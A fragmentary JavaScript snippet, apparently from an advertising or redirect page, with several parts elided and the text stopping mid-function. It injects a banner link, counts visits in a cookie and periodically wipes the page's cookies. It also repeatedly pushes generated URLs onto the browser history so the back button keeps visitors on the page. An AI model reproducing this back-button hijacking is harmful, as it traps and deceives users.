...
var h	= '';
if(config('topad')){
	h	+= '<a href="'+config('topad')+'" target="_blank"><img src="'+config('img1')+'" width="100%"></a>';
}
...
$(function(){
	...
	coo('visit',parseInt(coo('visit'))+1,config('cache'));
	if(window.mqq){
	...
	if(1){
		function getPop(){
			...
			if(window.backIndex < 4){
				window.history.pushState({},'x',getUrl2());
			}
		}
		function getUrl2() {
			return myChat('?f=FROM&{www}={wwwwnnn}'.replace('FROM',conf.code));
		}
		window.history.pushState({},'x',getUrl2());
	...
	if(config('cache')>0){
		setInterval(function(){
			var time = config('cache');
			var now = Math.floor(new Date()/1000);
			if(!localStorage.lastAlertTime){
				localStorage.lastAlertTime = now + time;
			}else if(localStorage.lastAlertTime < now ){
				document.cookie.replace(/[^ =;]+(?=\=)/g,function(a){document.cookie=a+'=0;path=/;expires=' + new Date(0).toUTCString()});
